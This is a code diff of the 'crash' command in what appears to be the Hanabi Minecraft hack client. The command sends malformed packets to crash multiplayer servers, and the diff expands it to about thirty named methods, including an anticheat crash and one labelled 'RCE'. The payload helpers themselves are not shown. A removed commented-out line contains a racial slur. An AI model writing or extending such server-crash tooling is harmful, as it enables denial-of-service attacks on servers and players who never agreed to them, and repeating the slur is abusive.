@@ -1,34 +1,38 @@
 package cn.hanabi.command.commands;
 
+
 import cn.hanabi.Hanabi;
-import cn.hanabi.Wrapper;
 import cn.hanabi.command.Command;
 import cn.hanabi.gui.classic.notifications.Notification;
 import cn.hanabi.utils.client.ClientUtil;
-import cn.hanabi.utils.game.PlayerUtil;
 import cn.hanabi.utils.crasher.CrashUtils;
+import cn.hanabi.utils.game.ChatUtils;
+import net.minecraft.client.Minecraft;
+import net.minecraft.network.Packet;
 import net.minecraft.network.play.client.C01PacketChatMessage;
-import org.jetbrains.annotations.NotNull;
 
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
+import java.util.Random;
 
 public class CrashCommand extends Command {
 
-    public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "Rsc1", "Rsc2", "Netty"};
-
+    public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "Payload", "Netty",
+            "Place", "Click", "Create", "Cap", "Place2", "Place3", "Click2", "Click3", "NettyP", "NettyPL", "NettyC", "AAC5",
+            "FWP", "FWC", "FWCreate", "FWP2", "FWP3", "FWC2", "FWC3", "Action", "Action2", "RCE"};
     CrashUtils crashUtils = new CrashUtils();
 
+    int bookType, bookvalue, redo, resolvebyte, json;
 
     public CrashCommand() {
-        super("crash");
+        super("crash", "c", "rip");
     }
 
     @Override
-    public void run(String alias, @NotNull String[] args) {
+    public void run(String alias, String[] args) {
         if (args.length < 1) {
-            ClientUtil.sendClientMessage("Usage: ." + alias + " method_name/list <amount> delay(ms)", Notification.Type.INFO);
+            ClientUtil.sendNotification(new Notification(".crash method/list amount delay type value redo resolveByte bypass", Notification.Type.INFO));
             return;
         }
 
@@ -40,51 +44,135 @@ public class CrashCommand extends Command {
 
         int value = amounts;
 
-        if (mc.isSingleplayer()) {
-            ClientUtil.sendClientMessage("Not Support", Notification.Type.ERROR);
+
+        if (Minecraft.getMinecraft().isSingleplayer()) {
+            ClientUtil.sendNotification(new Notification("You are in Single Game!", Notification.Type.ERROR));
         } else {
             try {
+                Hanabi.INSTANCE.timing = args.length > 2 ? Long.parseLong(args[2]) : 0L;
+
+                if (args.length > 5) {
+                    bookType = Integer.parseInt(args[3]);
+                    bookvalue = Integer.parseInt(args[4]);
+                    redo = Integer.parseInt(args[5]);
+                    if (args.length > 7) {
+                        resolvebyte = Integer.parseInt(args[6]);
+                        json = Integer.parseInt(args[7]);
+                    } else {
+                        resolvebyte = 1;
+                        json = 0;
+                    }
+                } else {
+                    bookType = 0;
+                    bookvalue = 800;
+                    redo = 5;
+                    resolvebyte = 1;
+                    json = 0;
+                }
+
+
                 Hanabi.INSTANCE.packetQueue.clear();
-                Hanabi.INSTANCE.timing = 0;
+
+                ChatUtils.info(bookType + " " + bookvalue + " " + redo + " " + resolvebyte + " " + json + " ");
 
                 switch (CrashType.toLowerCase()) {
                     case "pex": //Pex (outdated)
-                        Wrapper.sendPacketNoEvent(new C01PacketChatMessage(crashUtils.pexcrashexp1));
-                        Wrapper.sendPacketNoEvent(new C01PacketChatMessage(crashUtils.pexcrashexp2));
+                        sendPacket(new C01PacketChatMessage(crashUtils.pexcrashexp1));
+                        sendPacket(new C01PacketChatMessage(crashUtils.pexcrashexp2));
                         break;
                     case "fawe": //Old Fawe  (outdated)
-                        Wrapper.sendPacketNoEvent(new C01PacketChatMessage(crashUtils.fawe));
+                        sendPacket(new C01PacketChatMessage(crashUtils.fawe));
                         break;
                     case "mv": //Mv (outdated)
-                        Wrapper.sendPacketNoEvent(new C01PacketChatMessage(crashUtils.mv));
+                        sendPacket(new C01PacketChatMessage(crashUtils.mv));
                         break;
                     case "position":
                         crashUtils.custombyte(value);
                         break;
-                    case "rsc1":
-                 //       IChatComponent[] iTextComponentArray = new IChatComponent[]{new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText("")};
-                 //       iTextComponentArray[0] = new ChatComponentText(crashUtils.pdw);
-
-                 //         mc.getNetHandler().addToSendQueue(new C12PacketUpdateSign(BlockPos.ORIGIN, iTextComponentArray));
+                    case "payload":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, 833, 1, json, CrashUtils.CrashType.PAYLOAD1, amounts, 1);
                         break;
-                    case "rsc2":
-                 //       Wrapper.sendPacketNoEvent(new C12PacketUpdateSign(BlockPos.ORIGIN,
-                 //               new IChatComponent[]{new ChatComponentText(crashUtils.pdw2), new ChatComponentText("nigga"), new ChatComponentText("doyoulovemekid"), new ChatComponentText("ezmyfriend")}));
+                    case "payload2":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PAYLOAD2, amounts, resolvebyte);
+                        break;
+                    case "place":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PLACE, amounts, resolvebyte);
+                        break;
+                    case "click":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CLICK, amounts, resolvebyte);
+                        break;
+                    case "create":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CREATE, amounts, resolvebyte);
+                        break;
+                    case "cap":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CAP, amounts, resolvebyte);
                         break;
                     case "netty":
-                        crashUtils.crashdemo("a", 0, 1500, 5, false, CrashUtils.CrashType.PLACE, amounts);
+                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, 2, CrashUtils.CrashType.CLICK, amounts, resolvebyte);
+                        break;
+                    case "nettyp":
+                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, 2, CrashUtils.CrashType.PLACE3, amounts, resolvebyte);
+                        break;
+                    case "nettypl":
+                        crashUtils.crashdemo("/n", bookType, bookvalue, redo, 2, CrashUtils.CrashType.PAYLOAD1, amounts, resolvebyte);
+                        break;
+                    case "nettyc":
+                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, 2, CrashUtils.CrashType.CREATE, amounts, resolvebyte);
+                        break;
+                    case "place2":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PLACE2, amounts, resolvebyte);
+                        break;
+                    case "place3":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PLACE3, amounts, resolvebyte);
+                        break;
+                    case "click2":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CLICK2, amounts, resolvebyte);
+                        break;
+                    case "click3":
+                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CLICK3, amounts, resolvebyte);
+                        break;
+                    case "fwc":
+                        crashUtils.firework(amounts, CrashUtils.CrashType.CLICK);
+                        break;
+                    case "fwc2":
+                        crashUtils.firework(amounts, CrashUtils.CrashType.CLICK2);
+                        break;
+                    case "fw3":
+                        crashUtils.firework(amounts, CrashUtils.CrashType.CLICK3);
+                        break;
+                    case "fwp":
+                        crashUtils.firework(amounts, CrashUtils.CrashType.PLACE);
+                        break;
+                    case "fwp2":
+                        crashUtils.firework(amounts, CrashUtils.CrashType.PLACE2);
+                        break;
+                    case "fwp3":
+                        crashUtils.firework(amounts, CrashUtils.CrashType.PLACE3);
+                        break;
+                    case "fwcreate":
+                        crashUtils.firework(amounts, CrashUtils.CrashType.CREATE);
+                        break;
+                    case "action":
+                        crashUtils.actioncrash(amounts, bookType);
+                        break;
+                    case "action2":
+                        crashUtils.action2crash(amounts, bookType);
+                        break;
+                    case "aac5":
+                        crashUtils.aac5crash(amounts);
+                        break;
+                    case "rce":
+                        crashUtils.rce(amounts);
                         break;
                     case "list":
-                        PlayerUtil.tellPlayer(Arrays.toString(crashType));
+                        ChatUtils.send(Arrays.toString(crashType));
                         break;
                     default:
-                        PlayerUtil.tellPlayer("Couldn't Find the Crash Type");
+                        ChatUtils.send("This type doesn't exist.");
                 }
-                ClientUtil.sendClientMessage("Success Added Methods to Queue" + " " + CrashType, Notification.Type.INFO);
-
+                ClientUtil.sendClientMessage("Successfully added" + "  " + CrashType, Notification.Type.SUCCESS);
             } catch (Throwable ignore) {
-                ignore.printStackTrace();
-                ClientUtil.sendClientMessage("Got a error When you do" + " " + CrashType, Notification.Type.ERROR);
+                ClientUtil.sendClientMessage("Failed to crash" + " " + CrashType, Notification.Type.SUCCESS);
             }
         }
 
@@ -92,7 +180,6 @@ public class CrashCommand extends Command {
 
     @Override
     public List<String> autocomplete(int arg, String[] args) {
-        String prefix = "";
         boolean flag = false;
 
         try {
@@ -110,5 +197,9 @@ public class CrashCommand extends Command {
         if (flag) {
             return crashtype;
         } else return new ArrayList<>();
+    }
+
+    private void sendPacket(Packet<?> packet) {
+        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(packet);
     }
 }
